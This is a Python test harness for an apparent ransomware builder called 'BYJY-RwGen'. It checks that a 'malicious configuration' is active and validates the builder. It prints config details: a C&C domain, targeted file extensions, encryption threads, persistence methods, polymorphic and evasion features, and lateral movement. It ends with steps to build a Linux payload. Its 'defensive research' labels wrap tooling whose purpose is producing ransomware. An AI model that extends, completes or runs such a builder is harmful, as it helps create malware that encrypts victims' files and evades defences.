#!/usr/bin/env python3
"""
Test script for malicious configuration build
FOR DEFENSIVE RESEARCH PURPOSES ONLY
"""

import os
import sys
import subprocess
from pathlib import Path

def test_malicious_configuration():
    """Test the malicious configuration setup"""
    print("="*70)
    print("🔴 BYJY-RwGen MALICIOUS CONFIGURATION TEST")
    print("⚠️  FOR ADVANCED DEFENSIVE RESEARCH ONLY")
    print("="*70)
    
    # Check configuration status
    print("\n[1] Checking configuration status...")
    result = subprocess.run([sys.executable, "switch_to_malicious_config.py", "status"], 
                          capture_output=True, text=True)
    print(result.stdout.strip())
    
    # Validate tool completeness
    print("\n[2] Validating tool completeness...")
    result = subprocess.run([sys.executable, "validate_tool.py"], 
                          capture_output=True, text=True)
    
    if "100.0%" in result.stdout and "READY FOR RESEARCH" in result.stdout:
        print("✅ Tool validation: PASSED")
    else:
        print("❌ Tool validation: FAILED")
        print(result.stdout)
        return False
    
    # Test enhanced builder configuration detection
    print("\n[3] Testing enhanced builder...")
    result = subprocess.run([sys.executable, "enhanced_master_builder.py", "--configure"], 
                          capture_output=True, text=True)
    
    if "MALICIOUS CONFIGURATION DETECTED" in result.stdout:
        print("✅ Malicious configuration detection: PASSED")
    else:
        print("❌ Malicious configuration detection: FAILED")
        return False
    
    # Test Linux build preparation (without actual compilation)
    print("\n[4] Testing Linux build preparation...")
    try:
        result = subprocess.run([sys.executable, "enhanced_master_builder.py", "--validate"], 
                              capture_output=True, text=True, timeout=30)
        
        if "Advanced defensive research mode active" in result.stdout:
            print("✅ Linux build environment: READY")
        else:
            print("⚠️  Linux build environment: Some components missing")
            print("   (This is normal in containerized environments)")
        
    except subprocess.TimeoutExpired:
        print("⚠️  Build validation timed out (expected in container)")
    
    # Display configuration summary
    print("\n[5] Configuration Summary:")
    print("-" * 50)
    
    try:
        import json
        
        # Load and display key malicious parameters
        with open("build_config.json", 'r') as f:
            build_config = json.load(f)
        
        with open("c2_config.json", 'r') as f:
            c2_config = json.load(f)
            
        with open("payload_config.json", 'r') as f:
            payload_config = json.load(f)
        
        print(f"🎯 Executable Name: {build_config['main_executable']}")
        print(f"🔒 Obfuscation: {build_config['obfuscation_level']}")
        print(f"📁 Target Extensions: {len(build_config['target_extensions'])}")
        print(f"🌐 C&C Domain: {c2_config['c2_domain']}")
        print(f"⚡ Encryption Threads: {payload_config['encryption']['threads']}")
        print(f"🛡️ Persistence Methods: {len(payload_config['persistence']['methods'])}")
        
        # Check for advanced features
        advanced_features = []
        if build_config.get('polymorphic_engine'):
            advanced_features.append("Polymorphic Engine")
        if build_config.get('code_virtualization'):
            advanced_features.append("Code Virtualization")
        if payload_config.get('lateral_movement', {}).get('enabled'):
            advanced_features.append("Lateral Movement")
        if build_config.get('advanced_evasion', {}).get('syscall_obfuscation'):
            advanced_features.append("Syscall Obfuscation")
            
        if advanced_features:
            print("🚀 Advanced Features:", ", ".join(advanced_features))
        
    except Exception as e:
        print(f"Error reading configuration: {e}")
    
    print("\n" + "="*70)
    print("✅ MALICIOUS CONFIGURATION TEST COMPLETED SUCCESSFULLY")
    print("🛡️ READY FOR ADVANCED DEFENSIVE RESEARCH")
    print("⚠️ USE ONLY IN ISOLATED RESEARCH ENVIRONMENTS")
    print("="*70)
    
    return True

def main():
    if not test_malicious_configuration():
        print("❌ Malicious configuration test failed!")
        sys.exit(1)
    else:
        print("\n🎓 Next steps for your defensive research:")
        print("1. Set up isolated test environment (VM/container)")
        print("2. Configure monitoring tools (Wireshark, Sysmon)")
        print("3. Prepare test data in controlled location")
        print("4. Run: python3 enhanced_master_builder.py --build linux")
        print("5. Analyze generated payload in sandbox")
        print("6. Document defensive insights and findings")

if __name__ == "__main__":
    main()